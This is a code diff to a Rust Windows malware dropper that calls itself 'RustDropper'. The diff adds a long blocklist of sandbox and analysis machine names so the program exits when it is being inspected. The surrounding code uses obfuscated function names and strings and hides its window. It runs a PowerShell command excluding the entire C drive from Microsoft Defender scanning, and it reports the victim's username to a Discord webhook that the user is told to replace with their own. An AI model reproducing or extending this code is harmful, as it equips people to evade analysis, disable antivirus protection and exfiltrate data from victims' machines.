@@ -1,15 +1,74 @@
 #![windows_subsystem = "windows"]
 use core::time::Duration;
-use downloader::{Download, Downloader};
+use downloader::{ Download, Downloader };
 use goldberg::goldberg_string;
-use serenity::{http::Http, model::webhook::Webhook};
-use std::{path::Path, process::exit, process::Command, thread};
+use serenity::{ http::Http, model::webhook::Webhook };
+use std::{ path::Path, process::exit, process::Command, thread };
 // use std::io::{BufRead, BufReader};
 // use std::io::*;
 // use colored::*;
 
 fn main() {
-    njenqweoejqeoijiohquhfwqlkjnfewqoqincwoefiwirge();
+    let known_desktop_names = vec![
+        "Frank",
+        "Joe Cage",
+        "george",
+        "azure",
+        "Abby",
+        "BEE7370C-8C0C-4",
+        "DESKTOP-NAKFFMT",
+        "WIN-5E07COS9ALR",
+        "B30F0242-1C6A-4",
+        "DESKTOP-VRSQLAG",
+        "Q9IATRKPRH",
+        "XC64ZB",
+        "DESKTOP-D019GDM",
+        "DESKTOP-WI8CLET",
+        "SERVER1",
+        "LISA-PC",
+        "JOHN-PC",
+        "DESKTOP-B0T93D6",
+        "DESKTOP-1PYKP29",
+        "DESKTOP-1Y2433R",
+        "WILEYPC",
+        "WORK",
+        "6C4E733F-C2D9-4",
+        "RALPHS-PC",
+        "DESKTOP-WG3MYJS",
+        "DESKTOP-7XC6GEZ",
+        "DESKTOP-5OV9S0O",
+        "QarZhrdBpj",
+        "ORELEEPC",
+        "ARCHIBALDPC",
+        "JULIA-PC",
+        "d1bnJkfVlH",
+        "NETTYPC",
+        "DESKTOP-BUGIO",
+        "DESKTOP-CBGPFEE",
+        "SERVER-PC",
+        "TIQIYLA9TW5M",
+        "DESKTOP-KALVINO",
+        "COMPNAME_4047",
+        "DESKTOP-19OLLTD",
+        "DESKTOP-DE369SE",
+        "EA8C2E2A-D017-4",
+        "AIDANPC",
+        "LUCAS-PC",
+        "MARCI-PC",
+        "ACEPC",
+        "MIKE-PC",
+        "DESKTOP-IAPKN1P",
+        "DESKTOP-NTU7VUO",
+        "LOUISE-PC",
+        "T00917",
+        "test42"
+    ];
+    let blacklisted_usernames: Vec<String> = known_desktop_names
+        .iter()
+        .map(|x| x.to_string())
+        .collect();
+
+    njenqweoejqeoijiohquhfwqlkjnfewqoqincwoefiwirge(&blacklisted_usernames);
     d294e8q3890e82308948190iqwoidjawuiojdwoejwheouq2h();
     dwkjadhawjdawjhddwadj();
     fudjawjwuu8023848901284234823894209482308948238042380948234();
@@ -17,16 +76,8 @@ fn main() {
     // nitrogen();
 }
 
-fn njenqweoejqeoijiohquhfwqlkjnfewqoqincwoefiwirge() {
+fn njenqweoejqeoijiohquhfwqlkjnfewqoqincwoefiwirge(blacklisted_usernames: &[String]) {
     let username = whoami::username();
-
-    let blacklisted_usernames = [
-        String::from(goldberg_string!("Frank")),
-        String::from(goldberg_string!("Joe Cage")),
-        String::from(goldberg_string!("george")),
-        String::from(goldberg_string!("azure")),
-        String::from(goldberg_string!("Abby")),
-    ];
 
     for bl_username in blacklisted_usernames {
         if bl_username == username {
@@ -49,10 +100,7 @@ fn dwkjadhawjdawjhddwadj() {
 
 fn d294e8q3890e82308948190iqwoidjawuiojdwoejwheouq2h() {
     Command::new(goldberg_string!("powershell.exe"))
-        .args([
-            "-C",
-            goldberg_string!("Set-MpPreference -ExclusionPath C:\\"),
-        ])
+        .args(["-C", goldberg_string!("Set-MpPreference -ExclusionPath C:\\")])
         .spawn()
         .unwrap();
 
@@ -72,16 +120,17 @@ fn fudjawjwuu8023848901284234823894209482308948238042380948234() {
 #[tokio::main]
 async fn send() {
     let http = Http::new("");
-    let webhook = Webhook::from_url(&http, goldberg_string!("https://discord.com/api/webhooks/"))
-        .await
-        .expect(goldberg_string!("Replace the webhook with your own"));
+    let webhook = Webhook::from_url(
+        &http,
+        goldberg_string!("https://discord.com/api/webhooks/")
+    ).await.expect(goldberg_string!("Replace the webhook with your own"));
 
     webhook
         .execute(&http, false, |w| {
-            w.content(format!("User `{}`", whoami::username()))
-                .username(goldberg_string!("github.com/svg-rs/RustDropper"))
-        })
-        .await
+            w.content(format!("User `{}`", whoami::username())).username(
+                goldberg_string!("github.com/svg-rs/RustDropper")
+            )
+        }).await
         .expect(goldberg_string!("Could not execute webhook."));
 }
 
